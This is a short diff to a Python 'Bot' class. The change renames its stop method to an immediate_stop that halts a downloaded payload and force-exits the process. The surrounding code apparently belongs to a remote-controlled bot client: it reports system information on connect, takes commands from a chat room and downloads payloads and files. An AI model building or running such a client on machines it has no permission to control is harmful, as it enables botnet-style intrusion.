@@ -125,10 +125,13 @@ class Bot:
             f"CONNECT:{self.get_system_info()}"
         )
         
-    def stop(self):
+    def immediate_stop(self):
         self.announce_room.send_text(
             f"DISCONNECT:{self.command_room.room_id}:{self.bot_id}"
         )
+        self.payload.stop()
+        os._exit(0)
+
     
     def download_file(self, event, download_dir="downloads") -> str:
         content = event["content"]
@@ -237,8 +240,7 @@ class Bot:
                 self.payload.stop()
 
         elif command == "DISCONNECT":
-            self.payload.stop()
-            sys.exit(0)
+            self.immediate_stop()
         else:
             print(f"UNKNOWN: {msgbody}")
             
@@ -303,7 +305,7 @@ class Bot:
         self.download_payload()
         
         def exit_handler():
-            self.stop()
+            self.immediate_stop()
         atexit.register(exit_handler)
         
         threading.Thread(name="PING THREAD", target=self.check_pings, daemon=True).start()
